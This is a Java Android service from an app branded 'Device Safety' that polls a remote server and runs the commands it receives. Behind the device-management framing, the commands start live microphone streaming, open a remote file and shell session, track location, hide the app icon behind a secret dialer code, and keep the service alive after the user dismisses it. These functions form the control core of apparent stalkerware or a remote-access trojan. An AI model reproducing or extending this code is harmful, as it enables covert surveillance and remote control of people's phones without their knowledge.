package com.orphen.devicesafety;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class DeviceSyncService extends Service {
    public static final String ACTION_REQUEST_DEVICE_ADMIN = "com.orphen.devicesafety.REQUEST_DEVICE_ADMIN";
    public static final String ACTION_SYNC_UPDATE = "com.orphen.devicesafety.SYNC_UPDATE";
    public static final String EXTRA_REGISTERED = "registered";
    public static final String EXTRA_POLICY_TEXT = "policyText";
    public static final String EXTRA_STATUS_TEXT = "statusText";
    public static final String EXTRA_CONNECTION_STATUS = "connectionStatus";
    public static final String EXTRA_CLEAR_TOKEN = "clearToken";
    public static final String STATUS_CONNECTED = "Connected";
    public static final String STATUS_OFFLINE = "Offline";
    public static final String STATUS_WAITING = "Waiting";

    private static final String CHANNEL_ID = "device_safety_sync";
    private static final int NOTIFICATION_ID = 1001;
    private static final long SYNC_INTERVAL_MS = 30000;
    private static final String WAKE_LOCK_TAG = "DeviceSafety:Sync";

    private HandlerThread syncThread;
    private Handler syncHandler;
    private Runnable syncRunnable;
    private PowerManager.WakeLock syncWakeLock;
    private boolean syncLoopStarted;
    private volatile boolean syncInProgress;

    public static void startIfRegistered(Context context) {
        if (!BackendClient.hasDeviceToken(context)) {
            stopService(context);
            return;
        }
        Intent intent = new Intent(context, DeviceSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stopService(Context context) {
        SyncScheduler.cancelSync(context);
        context.stopService(new Intent(context, DeviceSyncService.class));
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        syncThread = new HandlerThread("DeviceSafetySync");
        syncThread.start();
        syncHandler = new Handler(syncThread.getLooper());
        LocationHelper.startTracking(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!BackendClient.hasDeviceToken(this)) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startSyncForeground("Background sync active");
        if (!syncLoopStarted) {
            syncLoopStarted = true;
            runSyncLoop(true);
        }
        SyncScheduler.scheduleNextSync(this, SYNC_INTERVAL_MS);
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (BackendClient.hasDeviceToken(this)) {
            SyncScheduler.scheduleNextSync(this, 5000L);
            DeviceSyncService.startIfRegistered(this);
        }
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        stopSyncLoop();
        LocationHelper.stopTracking(this);
        releaseWakeLock();
        if (syncThread != null) {
            syncThread.quitSafely();
            syncThread = null;
        }
        syncHandler = null;
        syncLoopStarted = false;
        if (BackendClient.hasDeviceToken(this)) {
            SyncScheduler.scheduleNextSync(this, 5000L);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void runSyncLoop(boolean immediate) {
        stopSyncLoop();
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                performSync();
                if (syncHandler != null && syncRunnable != null) {
                    syncHandler.postDelayed(syncRunnable, SYNC_INTERVAL_MS);
                }
            }
        };
        if (syncHandler == null) {
            return;
        }
        if (immediate) {
            syncHandler.post(syncRunnable);
        } else {
            syncHandler.postDelayed(syncRunnable, SYNC_INTERVAL_MS);
        }
    }

    private void stopSyncLoop() {
        if (syncHandler != null && syncRunnable != null) {
            syncHandler.removeCallbacks(syncRunnable);
        }
        syncRunnable = null;
    }

    private void performSync() {
        if (syncInProgress) {
            return;
        }
        syncInProgress = true;
        try {
            if (!BackendClient.hasDeviceToken(this)) {
                broadcastUpdate(false, "Registration status: Not registered", "", STATUS_WAITING, true);
                stopSelf();
                return;
            }

            acquireWakeLock();
            String statusText = "Registration status: Sync failed";
            String policyText = BackendClient.prefs(this).getString("lastPolicyText", "\nPolicy: Not synced yet");
            String connectionStatus = STATUS_OFFLINE;
            boolean registered = true;
            boolean clearToken = false;

            try {
                int syncResult = BackendClient.syncRegistrationStatus(this);
                if (syncResult == BackendClient.SYNC_AUTH_FAILED) {
                    broadcastUpdate(false, "Registration status: Deregistered", policyText, STATUS_WAITING, true);
                    updateNotification("Waiting for admin registration");
                    stopSelf();
                    return;
                }
                if (syncResult == BackendClient.SYNC_NETWORK_ERROR) {
                    broadcastUpdate(true, "Registration status: Registered (offline)", policyText, STATUS_OFFLINE, false);
                    updateNotification("Managed device offline");
                    SyncScheduler.scheduleNextSync(this, SYNC_INTERVAL_MS);
                    return;
                }
                statusText = "Registration status: Registered";
                policyText = BackendClient.syncPolicy(this);
                BackendClient.sendTelemetry(this, isDeviceAdminActive());
                processCommands();
                applySecurityStateFromServer();
                ensureRemoteOpsSession();
                updateNotification("Managed device online");
                connectionStatus = STATUS_CONNECTED;
                SyncScheduler.scheduleNextSync(this, SYNC_INTERVAL_MS);
            } catch (Exception exception) {
                statusText = "Registration status: Sync failed - " + exception.getMessage();
                updateNotification("Sync failed");
                if (!BackendClient.hasDeviceToken(this)) {
                    registered = false;
                    clearToken = true;
                    connectionStatus = STATUS_WAITING;
                } else {
                    registered = true;
                    connectionStatus = STATUS_OFFLINE;
                }
                SyncScheduler.scheduleNextSync(this, SYNC_INTERVAL_MS);
            } finally {
                releaseWakeLock();
            }

            broadcastUpdate(registered, statusText, policyText, connectionStatus, clearToken);
        } finally {
            syncInProgress = false;
        }
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        if (powerManager == null) {
            return;
        }
        if (syncWakeLock == null) {
            syncWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKE_LOCK_TAG);
            syncWakeLock.setReferenceCounted(false);
        }
        if (!syncWakeLock.isHeld()) {
            syncWakeLock.acquire(60 * 1000L);
        }
    }

    private void releaseWakeLock() {
        if (syncWakeLock != null && syncWakeLock.isHeld()) {
            syncWakeLock.release();
        }
    }

    private void processCommands() throws Exception {
        String response = BackendClient.fetchCommandsJson(this);
        JSONObject payload = new JSONObject(response);
        JSONArray commands = payload.optJSONArray("commands");
        if (commands == null) {
            return;
        }

        for (int index = 0; index < commands.length(); index++) {
            JSONObject command = commands.getJSONObject(index);
            int commandId = command.getInt("id");
            String type = command.getString("type");
            String commandPayload = command.optString("payload", "");
            executeCommand(commandId, type, commandPayload);
        }
    }

    private void startActivityOnMainThread(Intent intent) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                startActivity(intent);
            }
        });
    }

    private void executeCommand(int commandId, String type, String payload) {
        try {
            if ("sync_policy".equals(type)) {
                String policyText = BackendClient.syncPolicy(this);
                BackendClient.completeCommand(this, commandId, "completed", "Policy synced");
                broadcastUpdate(true, "Registration status: Registered", policyText, STATUS_CONNECTED, false);
                return;
            }
            if ("push_server_config".equals(type)) {
                String backendUrl = BackendClient.applyRemoteServerConfig(this, payload);
                BackendClient.completeCommand(this, commandId, "completed", "Server config updated to " + backendUrl);
                String policyText = BackendClient.syncPolicy(this);
                broadcastUpdate(true, "Server config updated: " + backendUrl, policyText, STATUS_CONNECTED, false);
                return;
            }
            if ("security_lock_prompt".equals(type)) {
                String message = payload == null || payload.trim().length() == 0
                        ? "Security alert — contact admin"
                        : payload.trim();
                Intent lockIntent = new Intent(this, SecurityLockActivity.class);
                lockIntent.putExtra("message", message);
                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityOnMainThread(lockIntent);
                BackendClient.completeCommand(this, commandId, "completed", "Security lock prompt shown");
                return;
            }
            if ("push_app_update".equals(type)) {
                String result = AppUpdateHelper.handleUpdateCommand(this, payload);
                BackendClient.completeCommand(this, commandId, "completed", result);
                return;
            }
            if ("push_wifi_profile".equals(type)) {
                String result = WifiProfileHelper.applyProfile(this, payload);
                BackendClient.completeCommand(this, commandId, "completed", result);
                return;
            }
            if ("enable_wifi".equals(type)) {
                String result = RemoteSettingsHelper.enableWifi(this);
                BackendClient.completeCommand(this, commandId, "completed", result);
                return;
            }
            if ("enable_location".equals(type)) {
                String result = RemoteSettingsHelper.enableLocation(this);
                BackendClient.completeCommand(this, commandId, "completed", result);
                return;
            }
            if ("show_alert".equals(type)) {
                Intent alertIntent = new Intent(this, AlertActivity.class);
                alertIntent.putExtra("message", payload);
                alertIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityOnMainThread(alertIntent);
                BackendClient.completeCommand(this, commandId, "completed", "Alert shown");
                return;
            }
            if ("request_device_admin".equals(type)) {
                if (isDeviceAdminActive()) {
                    BackendClient.completeCommand(this, commandId, "completed", "Device admin already active");
                    return;
                }
                Intent requestIntent = new Intent(this, MainActivity.class);
                requestIntent.setAction(ACTION_REQUEST_DEVICE_ADMIN);
                requestIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityOnMainThread(requestIntent);
                BackendClient.completeCommand(this, commandId, "completed", "Device admin prompt opened");
                return;
            }
            if ("start_audio_stream".equals(type)) {
                AudioStreamService.startStreaming(this);
                BackendClient.completeCommand(this, commandId, "completed", "Live audio stream started");
                return;
            }
            if ("stop_audio_stream".equals(type)) {
                AudioStreamService.stopStreaming(this);
                BackendClient.completeCommand(this, commandId, "completed", "Live audio stream stopped");
                return;
            }
            if ("start_remote_session".equals(type)) {
                RemoteOpsService.startIfRegistered(this);
                BackendClient.completeCommand(this, commandId, "completed", "Remote file/shell session started");
                return;
            }
            if ("stop_remote_session".equals(type)) {
                RemoteOpsService.stopService(this);
                BackendClient.completeCommand(this, commandId, "completed", "Remote file/shell session stopped");
                return;
            }
            if ("lock_app".equals(type)) {
                SecurityHelper.applyFromServer(this, true, SecurityHelper.isHidden(this));
                BackendClient.completeCommand(this, commandId, "completed", "App locked");
                return;
            }
            if ("unlock_app".equals(type)) {
                SecurityHelper.applyFromServer(this, false, SecurityHelper.isHidden(this));
                BackendClient.completeCommand(this, commandId, "completed", "App unlocked");
                return;
            }
            if ("hide_app".equals(type)) {
                SecurityHelper.applyFromServer(this, SecurityHelper.isLocked(this), true);
                String result = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !isDeviceOwnerApp()
                        ? "Hidden. Android may keep a system icon that opens App Info; use *#*#15072377#*#* to open the app."
                        : "App hidden";
                BackendClient.completeCommand(this, commandId, "completed", result);
                return;
            }
            if ("show_app".equals(type)) {
                SecurityHelper.applyFromServer(this, SecurityHelper.isLocked(this), false);
                HideModeNotifier.clearHiddenAccessNotice(this);
                BackendClient.completeCommand(this, commandId, "completed", "App shown");
                return;
            }
            if ("refresh_telemetry".equals(type)) {
                BackendClient.sendTelemetryPayload(this, TelemetryHelper.buildTelemetryPayload(this, isDeviceAdminActive()));
                BackendClient.completeCommand(this, commandId, "completed", "Live usage and battery telemetry refreshed");
                return;
            }
            BackendClient.completeCommand(this, commandId, "failed", "Unknown command");
        } catch (Exception exception) {
            try {
                BackendClient.completeCommand(this, commandId, "failed", exception.getMessage());
            } catch (Exception ignored) {
            }
        }
    }

    private boolean isDeviceOwnerApp() {
        DevicePolicyManager manager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        return manager != null && manager.isDeviceOwnerApp(getPackageName());
    }

    private boolean isDeviceAdminActive() {
        DevicePolicyManager manager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, SafetyDeviceAdminReceiver.class);
        return manager != null && manager.isAdminActive(admin);
    }

    private void ensureRemoteOpsSession() {
        try {
            JSONObject payload = BackendClient.fetchRemoteJobsJson(this);
            if (payload.optBoolean("sessionRequested", false) || payload.optBoolean("sessionActive", false)) {
                RemoteOpsService.startIfRegistered(this);
            }
        } catch (Exception ignored) {
        }
    }

    private void applySecurityStateFromServer() {
        try {
            JSONObject state = BackendClient.fetchSecurityState(this);
            SecurityHelper.applyFromServer(
                    this,
                    state.optBoolean("appLocked", false),
                    state.optBoolean("appHidden", false)
            );
        } catch (Exception exception) {
            Log.w("DeviceSyncService", "Security state sync failed: " + exception.getMessage());
            try {
                SecurityHelper.syncLocalVisibility(this);
            } catch (Exception ignored) {
            }
        }
    }

    private void broadcastUpdate(boolean registered, String statusText, String policyText, String connectionStatus, boolean clearToken) {
        Intent intent = new Intent(ACTION_SYNC_UPDATE);
        intent.setPackage(getPackageName());
        intent.putExtra(EXTRA_REGISTERED, registered);
        intent.putExtra(EXTRA_STATUS_TEXT, statusText);
        intent.putExtra(EXTRA_POLICY_TEXT, policyText);
        intent.putExtra(EXTRA_CONNECTION_STATUS, connectionStatus);
        intent.putExtra(EXTRA_CLEAR_TOKEN, clearToken);
        sendBroadcast(intent);
    }

    private void startSyncForeground(String contentText) {
        Notification notification = buildNotification(contentText);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            );
            return;
        }
        startForeground(NOTIFICATION_ID, notification);
    }

    private Notification buildNotification(String contentText) {
        Intent launchIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                launchIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
                .setContentTitle(getString(R.string.app_name))
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build();
    }

    private void updateNotification(String contentText) {
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (manager != null) {
            manager.notify(NOTIFICATION_ID, buildNotification(contentText));
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return;
        }
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Device Safety Sync",
                NotificationManager.IMPORTANCE_LOW
        );
        channel.setDescription("Keeps managed devices synced with the admin server.");
        channel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (manager != null) {
            manager.createNotificationChannel(channel);
        }
    }
}
